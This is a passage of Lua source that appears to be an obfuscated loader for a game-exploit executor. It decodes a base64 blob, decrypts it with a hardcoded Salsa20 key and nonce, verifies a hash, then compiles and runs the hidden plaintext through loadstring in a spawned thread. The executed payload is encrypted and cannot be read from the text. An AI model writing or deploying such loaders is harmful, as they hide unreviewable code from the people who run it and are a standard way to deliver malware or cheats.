feLKkPU31yMFRxNE2ctbcj1z8x3NRx8qLfqJ034Tj+VKtDXjihMWCiNuLi5HxIFJiV++7q2ZMCIt09fSco6vBYLY0gxLL7L8leGXiJj4Zi0bh0DbtosGLsvJVVRtpFTABa1/TMwpw5/I0fyGLbTqcpPa9fzYF9iyhMqAuGVhUIEgGmqM3IMCx3Lp+Lm/NYJw+oBwosIwaL/7MHp/pm06l/6xtUDExk5JFspO0x+tRyzVp+SUMTZY3MjspwGrxot0ajXI1AOoIDPbJTvShaoY0E+NSxkbBKBaBk"
  local _b8 = "GMUwD3SxFsFDqdNQikWKvXz2Uxo4uD92KQp87Hmp9V+fJvikriwn8kQ8KCWg9CUn8znWbdjAoulxegqvPoanoFr/0IzCwiDcfriLJW52PH0rHDHz1+fb1erDupCy0gRM4w0be0r7v3Hne9jDa9SJjpJWk3v86NgYK/ay9ZhHnGl+ihYsPY1bHceE9FFBvkXBCzsR/dtC9X/sCZNc5FbgcAeX7xzNyZTbt7hXel/7QI/20KohJQ5F1rLx3tL9KTAT5s0g9RjhXIYYBjvG5G5iRUxFmNvcPQRUEbe7NNGItzrXIOSxUMGjqWz+Awa+LsldvW2fLy7l8ucmeUYy3WdczlfuAuD3A23u1hbEhpLehwEf6HkhGURlzxJNwnI6uToVjImmGHebb/r2cAcCSKw3kWysDzbQ5v9904C+PXcn8EkctMA+ZruDc+cCmqJixaQ3vwhVi7u2jIWxAo/kehMyEuBFUYotGsHLgyqCWbsAAoybZ7yCQyCEvmdhIdbNTiNOq00tBgWDsi5uELvD7Aq8GkoYzaUir3XVzK65bQVJ2OlAyJlvp8mncH5SmheDvi/7tGdCWcXCGcyry4jjsrI="

  local _bitLib = bit32 or bit
  local _bXor, _bRotl

  if _bitLib and _bitLib.bxor and _bitLib.lrotate then
    _bXor = function(a, b) return _bitLib.bxor(math.floor(tonumber(a) or 0) % 4294967296, math.floor(tonumber(b) or 0) % 4294967296) end
    _bRotl = function(x, n) return _bitLib.lrotate(math.floor(tonumber(x) or 0) % 4294967296, math.floor(tonumber(n) or 0) % 32) end
  elseif _bitLib and _bitLib.bxor and _bitLib.lshift and _bitLib.rshift then
    _bXor = function(a, b) return _bitLib.bxor(math.floor(tonumber(a) or 0) % 4294967296, math.floor(tonumber(b) or 0) % 4294967296) end
    _bRotl = function(x, n)
      x = math.floor(tonumber(x) or 0) % 4294967296
      n = math.floor(tonumber(n) or 0) % 32
      return (_bitLib.lshift(x, n) + _bitLib.rshift(x, 32 - n)) % 4294967296
    end
  else
    _bXor = function(a, b)
      a = math.floor(tonumber(a) or 0) % 4294967296
      b = math.floor(tonumber(b) or 0) % 4294967296
      local r, m = 0, 1
      while a > 0 or b > 0 do
        if (a % 2) ~= (b % 2) then r = r + m end
        a = math.floor(a / 2); b = math.floor(b / 2); m = m * 2
      end
      return r
    end
    _bRotl = function(x, n)
      x = math.floor(tonumber(x) or 0) % 4294967296
      n = math.floor(tonumber(n) or 0) % 32
      if n == 0 then return x end
      local p1 = math.floor(x / 2^(32 - n))
      local p2 = (x * 2^n) % 4294967296
      return (p1 + p2) % 4294967296
    end
  end

  local function _chr(v)
    return string.char(math.floor(tonumber(v) or 0) % 256)
  end

  local function _hex2bin(h)
    local o = {}
    for i = 1, #h, 2 do
      local v = tonumber(h:sub(i, i + 1), 16)
      if v then o[#o + 1] = _chr(v) end
    end
    return table.concat(o)
  end

  local function _b64d(s)
    local tbl = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
    local o = {}
    for i = 1, #s, 4 do
      local a = (tbl:find(s:sub(i, i), 1, true) or 1) - 1
      local b = (tbl:find(s:sub(i + 1, i + 1), 1, true) or 1) - 1
      local c3 = s:sub(i + 2, i + 2)
      local c4 = s:sub(i + 3, i + 3)
      local c = c3 == "=" and 0 or (tbl:find(c3, 1, true) or 1) - 1
      local d = c4 == "=" and 0 or (tbl:find(c4, 1, true) or 1) - 1
      o[#o + 1] = _chr(a * 4 + math.floor(b / 16))
      if c3 ~= "=" then o[#o + 1] = _chr((b % 16) * 16 + math.floor(c / 4)) end
      if c4 ~= "=" then o[#o + 1] = _chr((c % 4) * 64 + d) end
    end
    return table.concat(o)
  end

  local _agc = _hex2bin("5a5232ea8166791ef0bd067b848885858f9d4b05254eb0efb9ab60ea72661337")
  local _lvh = _hex2bin("8bb828842956ca8f")

  if #_agc ~= 32 or #_lvh ~= 8 then
    _tmp = "invalid key/nonce"
    return
  end

  local SIG = {0x61707865, 0x3320646e, 0x79622d32, 0x6b206574}

  local function _block(k32, n32, ctr_lo, ctr_hi)
    local s = {
      SIG[1], k32[1], k32[2], k32[3], k32[4], SIG[2], n32[1], n32[2],
      ctr_lo, ctr_hi, SIG[3], k32[5], k32[6], k32[7], k32[8], SIG[4]
    }
    local o = {}
    for i = 1, 16 do o[i] = s[i] end

    local function qr(a, b, c2, d)
      s[b] = _bXor(s[b], _bRotl((s[a] + s[d]) % 4294967296, 7))
      s[c2] = _bXor(s[c2], _bRotl((s[b] + s[a]) % 4294967296, 9))
      s[d] = _bXor(s[d], _bRotl((s[c2] + s[b]) % 4294967296, 13))
      s[a] = _bXor(s[a], _bRotl((s[d] + s[c2]) % 4294967296, 18))
    end

    for _ = 1, 10 do
      qr(1, 5, 9, 13); qr(6, 10, 14, 2); qr(11, 15, 3, 7); qr(16, 4, 8, 12)
      qr(1, 2, 3, 4); qr(6, 7, 8, 5); qr(11, 12, 9, 10); qr(16, 13, 14, 15)
    end

    local out = {}
    for i = 1, 16 do
      local v = (s[i] + o[i]) % 4294967296
      v = math.floor(tonumber(v) or 0)
      out[#out + 1] = _chr(v % 256)
      out[#out + 1] = _chr(math.floor(v / 256) % 256)
      out[#out + 1] = _chr(math.floor(v / 65536) % 256)
      out[#out + 1] = _chr(math.floor(v / 16777216) % 256)
    end
    return table.concat(out)
  end

  local k32, n32 = {}, {}
  for i = 1, 8 do
    local p = (i - 1) * 4 + 1
    k32[i] = string.byte(_agc, p)
           + string.byte(_agc, p + 1) * 256
           + string.byte(_agc, p + 2) * 65536
           + string.byte(_agc, p + 3) * 16777216
  end
  for i = 1, 2 do
    local p = (i - 1) * 4 + 1
    n32[i] = string.byte(_lvh, p)
           + string.byte(_lvh, p + 1) * 256
           + string.byte(_lvh, p + 2) * 65536
           + string.byte(_lvh, p + 3) * 16777216
  end

  local raw = _b64d(table.concat({_b0, _b1, _b2, _b3, _b4, _b5, _b6, _b7, _b8}))
  local dec = {}
  local counter = 0
  local acc = {}

  for pos = 1, #raw, 64 do
    local lo = counter % 4294967296
    local hi = math.floor(counter / 4294967296) % 4294967296
    local block = _block(k32, n32, lo, hi)
    counter = counter + 1
    for i = 1, 64 do
      local idx = pos + i - 1
      if idx > #raw then break end
      acc[#acc + 1] = _chr(_bXor(string.byte(raw, idx), string.byte(block, i)))
    end
    if #acc >= 4096 then
      dec[#dec + 1] = table.concat(acc)
      acc = {}
    end
  end
  if #acc > 0 then dec[#dec + 1] = table.concat(acc) end

  _bpy = table.concat(dec)

  local h = 0
  for i = 1, #_bpy do
    h = (h * 16777619 + string.byte(_bpy, i)) % 4294967296
  end
  if h ~= 3162080664 then
    _tmp = "hash mismatch"
    return
  end

  local _load = loadstring or load
  if not _load and getfenv then
    local ok, f = pcall(getfenv)
    if ok and type(f) == "table" then _load = f.loadstring or f.load end
  end
  if not _load then
    _tmp = "no loadstring available in this executor"
    return
  end

  local _okTest, _compiledTest = _xkv(_load, "return 2+2")
  if not _okTest or not _compiledTest then
    _tmp = "loadstring check failed"
    return
  end
  local _okRun, _res = _xkv(_compiledTest)
  if not _okRun or _res ~= 4 then
    _tmp = "loadstring execution check failed"
    return
  end

  local _okComp, _fn = _xkv(_load, _bpy)
  if not _okComp or not _fn then
    _tmp = "compilation failed"
    return
  end

  -- 🔥 SOLUCIÓN AL HILO COLGADO: Ejecutar en task.spawn
  local function _doExec()
    local _okExec, _execErr = _xkv(_fn)
    if not _okExec then
      warn("[obf] runtime error: " .. tostring(_execErr))
    end
  end

  if task and task.spawn then
    task.spawn(_doExec)
  elseif spawn then
    spawn(_doExec)
  else
    local c = coroutine.create(_doExec)
    coroutine.resume(c)
  end
end

local _okGlobal, _globalErr = _xkv(_safeRun)
if not _okGlobal then
  warn("[obf] wrapper crashed: " .. tostring(_globalErr))
elseif _tmp then
  warn("[obf] " .. tostring(_tmp))
end
